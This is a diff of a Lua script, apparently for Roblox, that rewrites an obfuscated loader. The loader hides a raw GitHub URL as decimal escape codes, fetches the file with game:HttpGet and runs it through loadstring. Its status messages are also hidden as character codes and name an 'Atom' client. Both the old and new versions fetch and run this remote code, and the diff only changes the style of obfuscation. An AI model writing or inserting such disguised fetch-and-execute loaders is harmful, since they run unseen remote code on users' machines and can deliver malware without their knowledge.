@@ -53,57 +53,24 @@
 ⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ]]
 
-local z1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
-local function z2(z3)
-    local z4, z5 = "", 1
-    while z5 <= #z3 do
-        local z6 = z3:sub(z5, z5):byte()
-        if z6 == 92 then
-            local z7 = z3:sub(z5+1):match("(%d+)")
-            z4 = z4 .. string.char(tonumber(z7))
-            z5 = z5 + #z7 + 1
-        else
-            z4 = z4 .. z3:sub(z5, z5)
-        end
-        z5 = z5 + 1
+local b1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
+local function b2(b3)
+    local b4 = ""
+    for b5 in b3:gsub("\\(%d+)", function(b6) return string.char(tonumber(b6)) end):gmatch(".") do
+        b4 = b4 .. b5
     end
-    return z4
+    return b4
 end
-local function z8(z9)
-    local function za(zb)
-        local zc = game:HttpGet(zb)
-        return zc and loadstring(zc) or function() end
-    end
-    local zd = za(z9)
-    if zd then
-        (function() 
-            local ze = {76, 97, 117, 110, 99, 104, 105, 110, 103, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
-            local zf = ""
-            for zg = 1, #ze do
-                zf = zf .. string.char(ze[zg])
-            end
-            warn(zf)
-        end)() 
-        zd()
+local function b7(b8)
+    local b9 = game:HttpGet(b8)
+    if b9 then
+        (function() return warn("\76\97\117\110\99\104\105\110\103\32\65\116\111\109\32\45\32\67\108\105\101\110\116") end)() 
+        loadstring(b9)()
     else
-        (function()
-            local zh = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
-            local zi = ""
-            for zj = 1, #zh do
-                zi = zi .. string.char(zh[zj])
-            end
-            warn(zi)
-        end)()
+        (function() return warn("\67\97\110\39\116\32\108\111\97\100\32\65\116\111\109\32\45\32\67\108\105\101\110\116") end)() 
     end
 end
-local zk = (function() return z2(z1) end)
-local zl = (function() return z8(zk()) end)
-local zm = (function() if zk() then return zl() else (function()
-    local zn = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116, 46}
-    local zo = ""
-    for zp = 1, #zn do
-        zo = zo .. string.char(zn[zp])
-    end
-    warn(zo)
-end)() end end)
-zm()
+local c1 = function() return b2(b1) end
+local c2 = function() return b7(c1()) end
+local c3 = function() if c1() then return c2() else return warn("\67\97\110\39\116\32\108\111\97\100\32\65\116\111\109\32\45\32\67\108\105\101\110\116\46") end end
+c3()
